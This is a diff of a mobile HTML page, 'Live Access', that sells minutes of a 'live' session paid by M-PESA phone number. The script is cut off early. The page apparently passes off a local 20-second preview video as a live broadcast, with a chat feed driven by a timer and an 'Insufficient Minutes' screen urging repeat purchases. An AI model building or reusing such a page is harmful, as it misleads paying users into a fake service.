@@ -1,507 +1,1736 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Live Access • M-PESA</title>
+
+<meta name="viewport"
+content="width=device-width,initial-scale=1.0,
+maximum-scale=1.0,user-scalable=no">
+
+<title>Live Access</title>
 
 <style>
-*{
+  *{
   box-sizing:border-box;
+  margin:0;
+  padding:0;
   -webkit-tap-highlight-color:transparent;
 }
 
-body{
-  margin:0;
-  min-height:100vh;
-  font-family:Arial,sans-serif;
-  color:#fff;
-  background:
-    radial-gradient(circle at 20% 0%,#183b27 0,transparent 35%),
-    radial-gradient(circle at 100% 30%,#28133b 0,transparent 35%),
-    #050505;
-}
-
-.page{
+html,body{
   width:100%;
-  max-width:560px;
+  min-height:100%;
+  background:#05020d;
+  color:white;
+  font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+  overflow-x:hidden;
+}
+
+button,
+input{
+  font-family:inherit;
+}
+
+.app{
+  width:100%;
+  min-height:100vh;
+
+  background:
+  radial-gradient(
+    circle at 50% -10%,
+    #35104f 0%,
+    #10051d 35%,
+    #05020d 75%
+  );
+}
+
+.container{
+  width:100%;
+  max-width:600px;
   margin:auto;
-  padding:16px;
+  padding:14px;
 }
 
-.top{
+
+/* HEADER */
+
+.header{
   display:flex;
-  justify-content:space-between;
   align-items:center;
-  margin-bottom:18px;
+  justify-content:space-between;
+  gap:10px;
+
+  padding:8px 2px 16px;
 }
 
-.brand{
-  font-size:23px;
+.logo{
+  font-size:25px;
   font-weight:900;
+  letter-spacing:-1px;
 }
 
-.live{
-  background:#e90000;
-  border-radius:20px;
-  padding:7px 12px;
-  font-size:12px;
-  font-weight:bold;
-  box-shadow:0 0 18px #e9000080;
+.logo span{
+  color:#ff2c9c;
 }
 
-.live i{
-  display:inline-block;
-  width:7px;
-  height:7px;
-  background:#fff;
+.tagline{
+  font-size:9px;
+  color:#aaa;
+  margin-top:2px;
+}
+
+.live-now{
+  display:flex;
+  align-items:center;
+  gap:7px;
+
+  padding:8px 11px;
+
+  border-radius:30px;
+
+  background:#e91e63;
+
+  font-size:11px;
+  font-weight:900;
+
+  box-shadow:
+    0 0 18px rgba(255,0,110,.45);
+
+  animation:
+    livePulse 1.8s infinite;
+}
+
+.live-dot{
+  width:8px;
+  height:8px;
+
   border-radius:50%;
-  margin-right:5px;
+
+  background:white;
 }
+
+@keyframes livePulse{
+  0%,100%{
+    transform:scale(1);
+  }
+  50%{
+    transform:scale(1.04);
+  }
+}
+
+
+/* HERO */
 
 .hero{
-  text-align:center;
-  padding:18px 8px 22px;
+  position:relative;
+
+  min-height:220px;
+
+  border-radius:25px;
+
+  overflow:hidden;
+
+  border:1px solid #42165e;
+
+  background:
+  linear-gradient(
+    135deg,
+    #311043,
+    #10051d
+  );
+
+  box-shadow:
+    0 15px 45px rgba(0,0,0,.45);
+}
+
+.hero-image{
+  position:absolute;
+
+  inset:0;
+
+  width:100%;
+  height:100%;
+
+  object-fit:cover;
+
+  opacity:.55;
+}
+
+.hero-overlay{
+  position:absolute;
+
+  inset:0;
+
+  background:
+  linear-gradient(
+    90deg,
+    rgba(5,2,13,.95) 0%,
+    rgba(5,2,13,.55) 48%,
+    rgba(5,2,13,.15) 100%
+  );
+}
+
+.hero-content{
+  position:relative;
+
+  z-index:2;
+
+  padding:25px 20px;
+}
+
+.hero-live{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+
+  padding:7px 11px;
+
+  border-radius:7px;
+
+  background:#f21d67;
+
+  font-size:11px;
+  font-weight:900;
+
+  box-shadow:
+    0 0 18px rgba(242,29,103,.5);
 }
 
 .hero h1{
-  margin:0;
-  font-size:32px;
-  line-height:1.1;
+  margin-top:25px;
+
+  font-size:35px;
+  line-height:1;
+
+  max-width:300px;
 }
 
 .hero p{
-  color:#aaa;
-  margin:10px 0 0;
+  margin-top:12px;
+
+  color:#ddd;
+
+  font-size:14px;
+
+  line-height:1.5;
+
+  max-width:310px;
 }
 
-.stats{
+.activity{
   display:flex;
-  justify-content:center;
-  gap:9px;
-  margin-top:15px;
-}
-
-.stat{
-  background:#ffffff0d;
-  border:1px solid #ffffff18;
-  padding:8px 12px;
-  border-radius:20px;
-  color:#ccc;
-  font-size:12px;
-}
-
-.card{
-  background:linear-gradient(
-    145deg,
-    #171717,
-    #0c0c0c
-  );
-  border:1px solid #292929;
-  border-radius:23px;
-  padding:18px;
-  margin-bottom:16px;
-  box-shadow:0 15px 40px #0008;
-}
-
-.card-title{
-  display:flex;
-  justify-content:space-between;
   align-items:center;
+  gap:7px;
+
+  margin-top:17px;
+
+  color:#fff;
+
+  font-size:12px;
+  font-weight:700;
+}
+
+.activity i{
+  width:9px;
+  height:9px;
+
+  border-radius:50%;
+
+  background:#00ff79;
+
+  box-shadow:
+    0 0 12px #00ff79;
+
+  animation:
+    activityPulse 1.2s infinite;
+}
+
+@keyframes activityPulse{
+  0%,100%{
+    opacity:1;
+    transform:scale(1);
+  }
+  50%{
+    opacity:.45;
+    transform:scale(.7);
+  }
+  }
+  
+/* PACKAGE TITLE */
+
+.access-header{
+  display:flex;
+  align-items:flex-end;
+  justify-content:space-between;
+
+  gap:10px;
+
+  margin-top:25px;
   margin-bottom:15px;
 }
 
-.card-title h2{
-  margin:0;
-  font-size:19px;
+.access-title h2{
+  font-size:26px;
+  font-weight:900;
 }
 
-.card-title span{
-  color:#777;
+.access-title p{
+  margin-top:5px;
+
+  color:#a9a2b4;
+
   font-size:12px;
 }
 
-.packages{
+.joining{
+  padding:9px 12px;
+
+  border:1px solid #6424a1;
+
+  border-radius:25px;
+
+  color:#ddd;
+
+  background:#170925;
+
+  font-size:10px;
+  font-weight:800;
+}
+
+
+/* PACKAGE GRID */
+
+.package-grid{
   display:grid;
-  grid-template-columns:1fr 1fr;
+
+  grid-template-columns:
+  repeat(2,1fr);
+
   gap:12px;
 }
 
+
+/* PACKAGE CARD */
+
 .package{
   position:relative;
-  min-height:116px;
-  padding:17px 12px;
-  border-radius:18px;
-  background:#101010;
-  border:2px solid #292929;
+
+  min-height:165px;
+
+  padding:16px 10px 14px;
+
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+
   text-align:center;
+
+  border-radius:20px;
+
+  border:1px solid #43208b;
+
+  background:
+  linear-gradient(
+    145deg,
+    #170b2e,
+    #090414
+  );
+
   cursor:pointer;
-  transition:.2s;
+
+  overflow:hidden;
+
+  transition:
+    transform .18s ease,
+    border-color .18s ease,
+    box-shadow .18s ease;
+}
+
+.package::before{
+  content:"";
+
+  position:absolute;
+
+  width:120px;
+  height:120px;
+
+  top:-55px;
+  left:-55px;
+
+  border-radius:50%;
+
+  background:#8b2cff;
+
+  opacity:.12;
+
+  filter:blur(20px);
+}
+
+.package::after{
+  content:"";
+
+  position:absolute;
+
+  inset:-2px;
+
+  border-radius:20px;
+
+  border:1px solid transparent;
+
+  pointer-events:none;
 }
 
 .package:active{
   transform:scale(.96);
 }
 
+
+/* ACTIVE ANIMATION */
+
+.package:not(.selected){
+  animation:
+    cardFloat 3.8s ease-in-out infinite;
+}
+
+.package:nth-child(2){
+  animation-delay:.3s;
+}
+
+.package:nth-child(3){
+  animation-delay:.6s;
+}
+
+.package:nth-child(4){
+  animation-delay:.9s;
+}
+
+.package:nth-child(5){
+  animation-delay:1.2s;
+}
+
+.package:nth-child(6){
+  animation-delay:1.5s;
+}
+
+@keyframes cardFloat{
+  0%,100%{
+    transform:translateY(0);
+  }
+
+  50%{
+    transform:translateY(-2px);
+  }
+}
+
+
+/* SELECTED */
+
 .package.selected{
-  border-color:#25e05b;
+  border:2px solid #00ff73;
+
   background:
-    linear-gradient(
-      145deg,
-      #12351f,
-      #0b1710
-    );
+  linear-gradient(
+    145deg,
+    #0c2d20,
+    #07150f
+  );
+
   box-shadow:
-    0 0 0 1px #25e05b40,
-    0 0 25px #25e05b25;
+    0 0 12px rgba(0,255,115,.45),
+    0 0 35px rgba(0,255,115,.20),
+    inset 0 0 20px rgba(0,255,115,.08);
+
+  animation:
+    selectedGlow 1.8s ease-in-out infinite;
 }
 
-.package.selected:after{
-  content:"✓";
+@keyframes selectedGlow{
+  0%,100%{
+    box-shadow:
+      0 0 12px rgba(0,255,115,.4),
+      0 0 30px rgba(0,255,115,.16);
+  }
+
+  50%{
+    box-shadow:
+      0 0 20px rgba(0,255,115,.65),
+      0 0 45px rgba(0,255,115,.28);
+  }
+}
+
+
+/* AVAILABLE */
+
+.available{
   position:absolute;
-  top:7px;
-  left:8px;
-  width:21px;
-  height:21px;
-  line-height:21px;
+
+  top:11px;
+  left:11px;
+
+  display:flex;
+  align-items:center;
+  gap:5px;
+
+  color:#00ff88;
+
+  font-size:9px;
+  font-weight:900;
+}
+
+.available::before{
+  content:"";
+
+  width:7px;
+  height:7px;
+
   border-radius:50%;
-  background:#25e05b;
-  color:#061008;
-  font-size:13px;
-  font-weight:bold;
+
+  background:#00ff88;
+
+  box-shadow:
+    0 0 9px #00ff88;
 }
 
-.minutes{
-  font-size:23px;
+
+/* SELECTED BADGE */
+
+.selected-badge{
+  position:absolute;
+
+  top:9px;
+  right:9px;
+
+  display:none;
+
+  padding:5px 7px;
+
+  border-radius:7px;
+
+  background:#00e86b;
+
+  color:#031008;
+
+  font-size:8px;
   font-weight:900;
-  margin-top:5px;
 }
 
-.minutes small{
-  font-size:12px;
-  color:#aaa;
+.package.selected .selected-badge{
+  display:block;
 }
 
-.price{
-  margin-top:9px;
-  color:#32e867;
-  font-size:19px;
-  font-weight:900;
-}
+
+/* HOT */
 
 .hot{
   position:absolute;
-  top:-9px;
-  right:9px;
-  background:linear-gradient(90deg,#ff2525,#ff6b00);
-  padding:5px 9px;
+
+  top:0;
+  right:0;
+
+  padding:7px 10px;
+
+  border-radius:
+    0 18px 0 12px;
+
+  background:
+    linear-gradient(
+      135deg,
+      #ff1744,
+      #ff2c9c
+    );
+
+  color:#fff;
+
+  font-size:9px;
+  font-weight:900;
+
+  box-shadow:
+    0 0 15px rgba(255,30,100,.35);
+}
+
+
+/* MINUTES */
+
+.minutes{
+  position:relative;
+
+  margin-top:17px;
+
+  font-size:39px;
+
+  line-height:1;
+
+  font-weight:900;
+}
+
+.minutes small{
+  display:block;
+
+  margin-top:5px;
+
+  color:#c8c1d1;
+
+  font-size:12px;
+
+  letter-spacing:1px;
+}
+
+
+/* DIVIDER */
+
+.package-line{
+  width:70px;
+  height:2px;
+
+  margin:12px 0 9px;
+
+  background:
+    linear-gradient(
+      90deg,
+      transparent,
+      #8c4cff,
+      transparent
+    );
+}
+
+
+/* PRICE */
+
+.price{
+  color:#ffd900;
+
+  font-size:22px;
+  font-weight:900;
+
+  text-shadow:
+    0 0 12px rgba(255,217,0,.2);
+}
+
+
+/* SELECTED PRICE */
+
+.package.selected .price{
+  color:#ffd900;
+    }
+  
+/* PAYMENT AREA */
+
+.payment-panel{
+  margin-top:17px;
+
+  padding:16px;
+
+  border-radius:22px;
+
+  background:
+    linear-gradient(
+      145deg,
+      rgba(28,10,47,.95),
+      rgba(8,3,16,.95)
+    );
+
+  border:1px solid #4a2072;
+
+  box-shadow:
+    0 15px 40px rgba(0,0,0,.35);
+}
+
+.selection{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+
+  padding:12px;
+
+  border-radius:13px;
+
+  background:#0b0612;
+
+  border:1px solid #28163b;
+
+  margin-bottom:13px;
+}
+
+.selection-label{
+  color:#999;
+
+  font-size:10px;
+}
+
+.selection-value{
+  color:#00ff83;
+
+  font-size:14px;
+  font-weight:900;
+}
+
+
+/* PHONE */
+
+.input-label{
+  display:block;
+
+  margin:4px 0 7px;
+
+  color:#aaa;
+
+  font-size:11px;
+}
+
+#phone{
+  width:100%;
+  height:52px;
+
+  padding:0 14px;
+
+  border-radius:12px;
+
+  outline:none;
+
+  border:1px solid #352044;
+
+  background:#07030b;
+
+  color:#fff;
+
+  font-size:16px;
+}
+
+#phone:focus{
+  border-color:#00ef76;
+
+  box-shadow:
+    0 0 15px rgba(0,239,118,.12);
+}
+
+
+/* M-PESA BUTTON */
+
+#payButton{
+  position:relative;
+
+  width:100%;
+  height:58px;
+
+  margin-top:12px;
+
+  border:0;
+
+  border-radius:16px;
+
+  overflow:hidden;
+
+  background:
+    linear-gradient(
+      90deg,
+      #00b84a,
+      #00e676,
+      #00b84a
+    );
+
+  background-size:200% 100%;
+
+  color:white;
+
+  font-size:16px;
+  font-weight:900;
+
+  cursor:pointer;
+
+  box-shadow:
+    0 0 25px rgba(0,230,118,.3);
+
+  animation:
+    buttonShine 3s linear infinite;
+}
+
+@keyframes buttonShine{
+  0%{
+    background-position:0% 50%;
+  }
+  100%{
+    background-position:200% 50%;
+  }
+}
+
+#payButton::after{
+  content:"›";
+
+  position:absolute;
+
+  right:20px;
+
+  top:50%;
+
+  transform:
+    translateY(-53%);
+
+  font-size:28px;
+
+  font-weight:300;
+}
+
+#payButton:active{
+  transform:scale(.985);
+}
+
+#payButton:disabled{
+  opacity:.55;
+
+  animation:none;
+}
+
+.mpesa-icon{
+  display:inline-flex;
+
+  align-items:center;
+  justify-content:center;
+
+  width:28px;
+  height:28px;
+
+  margin-right:7px;
+
+  border-radius:7px;
+
+  background:rgba(0,0,0,.2);
+
+  font-size:15px;
+}
+
+
+/* SECURITY */
+
+.security{
+  display:grid;
+
+  grid-template-columns:
+  repeat(3,1fr);
+
+  gap:7px;
+
+  margin-top:13px;
+}
+
+.security-item{
+  padding:10px 5px;
+
+  text-align:center;
+
+  color:#8d8796;
+
+  font-size:9px;
+
+  border-radius:10px;
+
+  background:#0a0510;
+}
+
+.security-icon{
+  display:block;
+
+  margin-bottom:5px;
+
+  font-size:17px;
+
+  color:#bda7ff;
+}
+
+
+/* ERROR */
+
+#errorMessage{
+  display:none;
+
+  margin-top:10px;
+
+  padding:10px;
+
   border-radius:9px;
+
+  background:#2b0810;
+
+  border:1px solid #7d182d;
+
+  color:#ff536f;
+
+  text-align:center;
+
+  font-size:11px;
+}
+
+
+/* WAITING */
+
+#waitingScreen{
+  display:none;
+
+  position:fixed;
+
+  z-index:100;
+
+  inset:0;
+
+  align-items:center;
+  justify-content:center;
+
+  padding:20px;
+
+  background:
+    rgba(2,0,7,.97);
+}
+
+.wait-card{
+  width:100%;
+  max-width:390px;
+
+  padding:32px 20px;
+
+  text-align:center;
+
+  border-radius:22px;
+
+  background:#10071a;
+
+  border:1px solid #4c2370;
+}
+
+.loader{
+  width:58px;
+  height:58px;
+
+  margin:0 auto 20px;
+
+  border:5px solid #302039;
+
+  border-top-color:#00ef76;
+
+  border-radius:50%;
+
+  animation:
+    spin .8s linear infinite;
+}
+
+@keyframes spin{
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+.wait-card h2{
+  font-size:21px;
+}
+
+.wait-card p{
+  margin-top:9px;
+
+  color:#999;
+
+  font-size:12px;
+
+  line-height:1.5;
+  }
+  
+/* INSUFFICIENT */
+
+#insufficientScreen{
+  display:none;
+
+  position:fixed;
+
+  z-index:120;
+
+  inset:0;
+
+  align-items:center;
+  justify-content:center;
+
+  padding:20px;
+
+  background:#05020a;
+}
+
+.insufficient-card{
+  width:100%;
+  max-width:390px;
+
+  padding:35px 20px;
+
+  text-align:center;
+
+  border-radius:22px;
+
+  background:#11070c;
+
+  border:1px solid #6b1730;
+
+  box-shadow:
+    0 0 40px rgba(255,30,70,.12);
+}
+
+.insufficient-icon{
+  width:65px;
+  height:65px;
+
+  display:flex;
+  align-items:center;
+  justify-content:center;
+
+  margin:0 auto 18px;
+
+  border-radius:50%;
+
+  background:#2a0912;
+
+  color:#ff365e;
+
+  font-size:30px;
+}
+
+.insufficient-card h2{
+  color:#ff3e64;
+
+  font-size:24px;
+}
+
+.insufficient-card p{
+  margin-top:10px;
+
+  color:#aaa;
+
+  font-size:13px;
+
+  line-height:1.5;
+}
+
+#returnCounter{
+  margin-top:17px;
+
+  color:#00ed76;
+
+  font-size:12px;
+  font-weight:800;
+}
+
+
+/* LIVE PAGE */
+
+#liveScreen{
+  display:none;
+
+  position:fixed;
+
+  z-index:110;
+
+  inset:0;
+
+  overflow-y:auto;
+
+  background:#000;
+}
+
+.live-top{
+  position:sticky;
+
+  top:0;
+
+  z-index:5;
+
+  height:53px;
+
+  display:flex;
+
+  align-items:center;
+
+  justify-content:center;
+
+  background:#050505;
+
+  border-bottom:1px solid #181818;
+}
+
+.live-status{
+  position:absolute;
+
+  left:11px;
+
+  padding:6px 10px;
+
+  border-radius:6px;
+
+  background:#ed174b;
+
+  font-size:10px;
+  font-weight:900;
+
+  box-shadow:
+    0 0 15px rgba(237,23,75,.35);
+}
+
+.watchers{
+  position:absolute;
+
+  right:12px;
+
+  color:#aaa;
+
+  font-size:10px;
+}
+
+.live-video-wrap{
+  position:relative;
+
+  width:100%;
+
+  background:#000;
+}
+
+#liveVideo{
+  display:block;
+
+  width:100%;
+
+  max-height:65vh;
+
+  object-fit:cover;
+
+  background:#000;
+}
+
+.live-info{
+  padding:12px;
+
+  border-bottom:1px solid #181818;
+
+  font-size:12px;
+  font-weight:800;
+}
+
+.live-green{
+  display:inline-block;
+
+  width:7px;
+  height:7px;
+
+  margin-right:5px;
+
+  border-radius:50%;
+
+  background:#00ef76;
+
+  box-shadow:
+    0 0 10px #00ef76;
+}
+
+.chat-heading{
+  padding:12px;
+
+  color:#777;
+
   font-size:10px;
   font-weight:900;
 }
 
-.phone-title{
-  color:#aaa;
-  font-size:13px;
-  margin:18px 0 8px;
+#comments{
+  padding:0 12px 30px;
+
+  min-height:220px;
+
+  overflow:hidden;
 }
 
-.phone{
-  width:100%;
-  padding:16px;
-  border-radius:14px;
-  border:1px solid #353535;
-  outline:none;
-  background:#080808;
-  color:#fff;
-  font-size:17px;
-}
-
-.phone:focus{
-  border-color:#25e05b;
-  box-shadow:0 0 0 3px #25e05b18;
-}
-
-.pay{
-  width:100%;
-  margin-top:13px;
-  padding:17px;
-  border:0;
-  border-radius:15px;
-  background:linear-gradient(90deg,#20d957,#62f08a);
-  color:#041007;
-  font-size:17px;
-  font-weight:900;
-  box-shadow:0 10px 25px #25e05b25;
-}
-
-.pay:active{
-  transform:scale(.98);
-}
-
-.pay:disabled{
-  opacity:.55;
-}
-
-.error{
-  display:none;
-  margin-top:9px;
-  padding:10px;
-  border-radius:10px;
-  background:#3a1010;
-  color:#ff6868;
-  text-align:center;
-  font-size:13px;
-}
-
-.screen{
-  display:none;
-}
-
-.screen.active{
-  display:block;
-}
-
-.center{
-  min-height:100vh;
+.comment{
   display:flex;
+
+  gap:8px;
+
+  margin:8px 0;
+}
+
+.avatar{
+  width:29px;
+  height:29px;
+
+  min-width:29px;
+
+  display:flex;
+
   align-items:center;
   justify-content:center;
-}
 
-.wait{
-  width:100%;
-  text-align:center;
-  padding:32px 20px;
-  border-radius:25px;
-  background:#111;
-  border:1px solid #292929;
-  box-shadow:0 20px 50px #000;
-}
-
-.spinner{
-  width:65px;
-  height:65px;
-  margin:0 auto 22px;
-  border:5px solid #303030;
-  border-top-color:#25e05b;
   border-radius:50%;
-  animation:spin 1s linear infinite;
+
+  background:#27202e;
+
+  color:#ddd;
+
+  font-size:10px;
+  font-weight:900;
 }
 
-@keyframes spin{
-  to{transform:rotate(360deg)}
+.comment-bubble{
+  padding:7px 10px;
+
+  border-radius:11px;
+
+  background:#111;
+
+  max-width:85%;
 }
 
-.wait h2{
-  margin:0;
-  font-size:24px;
+.comment-name{
+  color:#ff55a7;
+
+  font-size:10px;
+  font-weight:900;
 }
 
-.wait p{
-  color:#999;
-  line-height:1.5;
-  font-size:14px;
+.comment-text{
+  margin-top:2px;
+
+  color:#eee;
+
+  font-size:12px;
 }
 
-.status{
-  margin-top:16px;
-  color:#32e867;
-  font-size:14px;
-  font-weight:bold;
+
+/* MOBILE */
+
+@media(max-width:390px){
+
+  .container{
+    padding:10px;
+  }
+
+  .hero{
+    min-height:205px;
+  }
+
+  .hero h1{
+    font-size:31px;
+  }
+
+  .package{
+    min-height:153px;
+  }
+
+  .minutes{
+    font-size:34px;
+  }
+
+  .price{
+    font-size:20px;
+  }
+
+  .access-title h2{
+    font-size:22px;
+  }
+
 }
 
-.failed{
-  color:#ff4141;
-  font-size:42px;
-  margin-bottom:15px;
-}
 </style>
 </head>
-
 <body>
 
-<div id="packagesScreen" class="screen active">
-  <div class="page">
+<div class="app">
 
-    <div class="top">
-      <div class="brand">LIVE ACCESS</div>
-      <div class="live">
-        <i></i> LIVE NOW
-      </div>
+<div class="container">
+
+
+<!-- HEADER -->
+
+<header class="header">
+
+  <div>
+    <div class="logo">
+      Live<span>X</span>
     </div>
 
-    <div class="hero">
-      <h1>Choose Your<br>Live Package</h1>
-      <p>Get instant access after M-PESA payment.</p>
+    <div class="tagline">
+      Real people. Live moments.
+    </div>
+  </div>
 
-      <div class="stats">
-        <div class="stat">🟢 Active</div>
-        <div class="stat">👥 21 online</div>
-        <div class="stat">⚡ Instant access</div>
-      </div>
+  <div class="live-now">
+    <span class="live-dot"></span>
+    LIVE NOW
+  </div>
+
+</header>
+
+
+<!-- HERO -->
+
+<section class="hero">
+
+  <img
+    class="hero-image"
+    src="hero.jpg"
+    alt=""
+  >
+
+  <div class="hero-overlay"></div>
+
+  <div class="hero-content">
+
+    <div class="hero-live">
+      <span class="live-dot"></span>
+      LIVE
     </div>
 
-    <div class="card">
+    <h1>
+      Join the Live
+    </h1>
 
-      <div class="card-title">
-        <h2>🔥 Available Packages</h2>
-        <span>Select one</span>
-      </div>
+    <p>
+      Choose your access and connect
+      to the live experience.
+    </p>
 
-      <div class="packages">
+    <div class="activity">
+      <i></i>
+      Live activity is happening now
+    </div>
 
-        <div class="package selected"
-             data-minutes="30"
-             data-price="95">
-          <div class="minutes">
-            30 <small>MIN</small>
-          </div>
-          <div class="price">KSh 95</div>
-        </div>
+  </div>
 
-        <div class="package"
-             data-minutes="55"
-             data-price="138">
-          <div class="minutes">
-            55 <small>MIN</small>
-          </div>
-          <div class="price">KSh 138</div>
-        </div>
+</section>
 
-        <div class="package"
-             data-minutes="73"
-             data-price="207">
-          <div class="minutes">
-            73 <small>MIN</small>
-          </div>
-          <div class="price">KSh 207</div>
-        </div>
 
-        <div class="package"
-             data-minutes="95"
-             data-price="253">
-          <div class="minutes">
-            95 <small>MIN</small>
-          </div>
-          <div class="price">KSh 253</div>
-        </div>
+<!-- ACCESS HEADER -->
 
-        <div class="package"
-             data-minutes="105"
-             data-price="299">
-          <div class="minutes">
-            105 <small>MIN</small>
-          </div>
-          <div class="price">KSh 299</div>
-        </div>
+<div class="access-header">
 
-        <div class="package"
-             data-minutes="166"
-             data-price="393">
-          <div class="hot">🔥 HOT</div>
-          <div class="minutes">
-            166 <small>MIN</small>
-          </div>
-          <div class="price">KSh 393</div>
-        </div>
+  <div class="access-title">
 
-      </div>
+    <h2>
+      CHOOSE YOUR ACCESS
+    </h2>
 
-      <div class="phone-title">
-        M-PESA phone number
-      </div>
+    <p>
+      Select the minutes you want
+    </p>
 
-      <input
-        id="phone"
-        class="phone"
-        type="tel"
-        inputmode="numeric"
-        maxlength="13"
-        placeholder="07XXXXXXXX"
-      >
+  </div>
 
-      <div id="error" class="error"></div>
+  <div class="joining">
+    ● AVAILABLE
+  </div>
 
-      <button id="payButton" class="pay">
-        💚 PAY WITH M-PESA
-      </button>
+</div>
+
+
+<!-- PACKAGES -->
+
+<div class="package-grid">
+
+
+  <!-- 30 -->
+
+  <div
+    class="package selected"
+    data-minutes="30"
+    data-price="95"
+  >
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      30
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 95
+    </div>
+
+  </div>
+
+
+  <!-- 55 -->
+
+  <div
+    class="package"
+    data-minutes="55"
+    data-price="138"
+  >
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      55
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 138
+    </div>
+
+  </div>
+  
+  <!-- 73 -->
+
+  <div
+    class="package"
+    data-minutes="73"
+    data-price="207"
+  >
+
+    <div class="hot">
+      🔥 POPULAR
+    </div>
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      73
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 207
+    </div>
+
+  </div>
+
+
+  <!-- 95 -->
+
+  <div
+    class="package"
+    data-minutes="95"
+    data-price="253"
+  >
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      95
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 253
+    </div>
+
+  </div>
+
+
+  <!-- 105 -->
+
+  <div
+    class="package"
+    data-minutes="105"
+    data-price="299"
+  >
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      105
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 299
+    </div>
+
+  </div>
+
+
+  <!-- 166 -->
+
+  <div
+    class="package"
+    data-minutes="166"
+    data-price="393"
+  >
+
+    <div class="hot">
+      🔥 HOT
+    </div>
+
+    <div class="available">
+      AVAILABLE
+    </div>
+
+    <div class="selected-badge">
+      ✓ SELECTED
+    </div>
+
+    <div class="minutes">
+      166
+      <small>MINUTES</small>
+    </div>
+
+    <div class="package-line"></div>
+
+    <div class="price">
+      KSh 393
+    </div>
+
+  </div>
+
+
+</div>
+
+
+<!-- PAYMENT PANEL -->
+
+<div class="payment-panel">
+
+  <div class="selection">
+
+    <div class="selection-label">
+      YOUR SELECTED PACKAGE
+    </div>
+
+    <div class="selection-value">
+
+      <span id="selectedMinutes">
+        30
+      </span>
+      MIN —
+      KSh
+      <span id="selectedPrice">
+        95
+      </span>
 
     </div>
 
   </div>
-</div>
-<!-- M-PESA WAITING SCREEN -->
-<div id="waitingScreen" class="screen">
-  <div class="page center">
 
-    <div class="wait">
 
-      <div class="spinner"></div>
+  <label
+    class="input-label"
+    for="phone"
+  >
+    M-PESA PHONE NUMBER
+  </label>
 
-      <h2 id="waitingTitle">
-        Sending M-PESA Prompt
-      </h2>
+  <input
+    id="phone"
+    type="tel"
+    inputmode="numeric"
+    autocomplete="tel"
+    maxlength="10"
+    placeholder="07XXXXXXXX"
+  >
 
-      <p id="waitingText">
-        Please wait while we send the payment
-        request to your phone.
-      </p>
 
-      <div id="paymentStatus" class="status">
-        Connecting to M-PESA...
-      </div>
+  <button
+    id="payButton"
+    type="button"
+  >
 
+    <span class="mpesa-icon">
+      M
+    </span>
+
+    PAY WITH M-PESA
+
+  </button>
+
+
+  <div id="errorMessage"></div>
+
+
+  <div class="security">
+
+    <div class="security-item">
+      <span class="security-icon">✓</span>
+      Secure
+    </div>
+
+    <div class="security-item">
+      <span class="security-icon">⚡</span>
+      Fast
+    </div>
+
+    <div class="security-item">
+      <span class="security-icon">🔒</span>
+      Private
     </div>
 
   </div>
+
 </div>
 
 
-<!-- PAYMENT FAILED SCREEN -->
-<div id="failedScreen" class="screen">
-  <div class="page center">
+</div>
+</div>
 
-    <div class="wait">
+<!-- PAYMENT WAITING -->
 
-      <div class="failed">×</div>
+<section id="waitingScreen">
 
-      <h2>No payment is done</h2>
+  <div class="wait-card">
 
-      <p>
-        We did not receive a successful M-PESA
-        payment. You can try again.
-      </p>
+    <div class="loader"></div>
 
-      <button
-        onclick="showPackages()"
-        class="pay"
-        style="margin-top:15px"
-      >
-        BACK TO PACKAGES
-      </button>
+    <h2 id="waitingTitle">
+      Sending M-PESA prompt...
+    </h2>
 
+    <p id="waitingText">
+      Please check your phone and
+      approve the M-PESA request.
+    </p>
+
+  </div>
+
+</section>
+
+
+<!-- LIVE SCREEN -->
+
+<section id="liveScreen">
+
+  <div class="live-top">
+
+    <div class="live-status">
+      🔴 LIVE
+    </div>
+
+    <div class="watchers">
+      LIVE SESSION
     </div>
 
   </div>
-</div>
+
+
+  <div class="live-video-wrap">
+
+    <video
+      id="liveVideo"
+      playsinline
+      preload="auto"
+      src="preview_20_seconds.mp4"
+    ></video>
+
+  </div>
+
+
+  <div class="live-info">
+
+    <span class="live-green"></span>
+
+    Connected to LIVE
+
+  </div>
+
+
+  <div class="chat-heading">
+    LIVE CHAT
+  </div>
+
+  <div id="comments"></div>
+
+</section>
+
+
+<!-- INSUFFICIENT -->
+
+<section id="insufficientScreen">
+
+  <div class="insufficient-card">
+
+    <div class="insufficient-icon">
+      ⏱
+    </div>
+
+    <h2>
+      Insufficient Minutes
+    </h2>
+
+    <p>
+      Your live access has ended.
+      Choose another package to continue.
+    </p>
+
+    <div id="returnCounter">
+      Returning to packages in 2...
+    </div>
+
+  </div>
+
+</section>
 
 
 <script>
+
+  
 let selectedMinutes = 30;
 let selectedPrice = 95;
+
 let transactionId = null;
-let attempts = 0;
-let checkTimer = null;
 
-const packagesScreen =
-  document.getElementById("packagesScreen");
+let paymentChecking = false;
 
-const waitingScreen =
-  document.getElementById("waitingScreen");
+let liveFinished = false;
 
-const failedScreen =
-  document.getElementById("failedScreen");
+let liveTimer = null;
+
+let chatTimer = null;
+
+
+const packages =
+  document.querySelectorAll(".package");
+
+const selectedMinutesText =
+  document.getElementById(
+    "selectedMinutes"
